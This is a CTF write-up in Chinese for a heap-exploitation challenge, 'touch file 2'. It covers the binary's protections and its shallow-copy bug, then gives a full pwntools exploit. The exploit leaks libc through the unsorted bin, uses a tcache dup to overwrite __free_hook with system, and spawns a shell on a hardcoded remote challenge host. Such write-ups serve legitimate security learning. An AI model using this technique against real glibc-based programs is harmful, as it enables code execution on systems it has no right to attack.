# touch file 2

## 文件分析

NX on, PIE on, Canary off, RELRO full  
ghidra分析为64位程序  
glibc: 2.31

## 逆向

程序模拟了命令行的执行，是一道简单堆题，主要利用点在cp命令上，
浅拷贝的模式使得uaf、double free十分容易

这道题中分配单元固定，为0x80，分配的chunk大小为0x91，首先分配7个耗尽tcache，
然后分配一个在unsorted bin中，cp+rm+cat读取main_arena，推出libcBase；
再进行tcache dup，把`__free_hook`写上system，最后给一个chunk上写上/bin/sh，
free它就能拿到shell

## 踩过的坑

1. strncpy函数会将size中未输入的部分全部填0，并且复制时是'\0'截断的！这点要注意
2. 这题附件给了ld，给了libc，但是libstdc++之类的其他依赖都没给，这时候借助docker，
下载一个ubuntu容器可以快速解决问题（主要是本地的libcstdc++依赖高版本libc）
3. 手动释放一个chunk到unsorted bin中需要满足对应的后一个chunk处(&chunk + size)
的P位设为1
4. 当getline得到一个超长输入时，会分配一个chunk，用完后释放，可以考虑写入大量垃圾字符，
来触发`malloc_consolidate`（不是用在这题）

## EXPLOIT

```python
# 类型注释包含新版本特性，如无法运行，建议把类型注释删掉
from pwn import *
def execute(*args: str | bytes):
    global sh
    sh.recvuntil(b'>')
    sh.sendline(b' '.join(map(lambda arg: arg.encode() if isinstance(arg, str) else arg, args)))

def payload(lo):
    global sh
    if lo:
        sh = process('./touch_file2')
        if lo & 0b10:
            gdb.attach(sh, gdbscript = 'b *$rebase(0x1ab1)')
    else:
        sh = remote('43.249.195.138', 21815)
    libc = ELF('/home/Rocket/glibc-all-in-one/libs/2.31-0ubuntu9.12_amd64/libc-2.31.so')# strncpy 会向dest中补充\0字符！！

    execute('touch', 'a')
    execute('touch', 'b')
    execute('touch', 'c')
    execute('touch', 'd')
    execute('touch', 'e')
    execute('touch', 'f')
    execute('touch', 'g')
    execute('touch', 'h')
    execute('rm', 'h')
    execute('rm', 'g')
    execute('rm', 'f')
    execute('rm', 'e')
    execute('rm', 'd')
    execute('rm', 'c')
    execute('rm', 'b')

    execute('cp', 'a', 'aa')
    execute('rm', 'aa') # tcache full (7), free in unsorted bin
    execute('cat', 'a') # print fd (main_arena)

    dumpArena = libc.symbols['__malloc_hook'] + (libc.symbols['__malloc_hook'] - libc.symbols['__realloc_hook']) * 2
    mainArena = u64(sh.recvline()[-7:-1] + b'\0\0') - 0x60 # sub unsorted bin offset
    libcBase = mainArena - dumpArena
    freeHook = libcBase + libc.symbols['__free_hook']
    system = libcBase + libc.symbols['system']

    execute('touch', 'b')
    execute('touch', 'c')
    execute('touch', 'd')
    execute('touch', 'e') # alloc some chunks to consume tcache for tcache dup

    execute('touch', 'x')
    execute('cp', 'x', 'xx')
    execute('rm', 'xx')
    # tcache linked list status
    # head -> x -> f -> g -> h
    execute('edit', 'x', p64(freeHook))  # next = freeHook, key = 0
    # head -> x -> freeHook -> NULL
    execute('touch', 'y', p64(freeHook)) # next = freeHook, key = 0; without this content, next = 0
    # head -> freeHook -> NULL
    execute('touch', 'z', p64(system))   # modify *freeHook = system
    execute('edit', 'c', '/bin/sh')
    execute('rm', 'c') # free(chunk), *chunk => "/bin/sh", execute system("/bin/sh")

    sh.interactive()

payload(0)
```

Done.
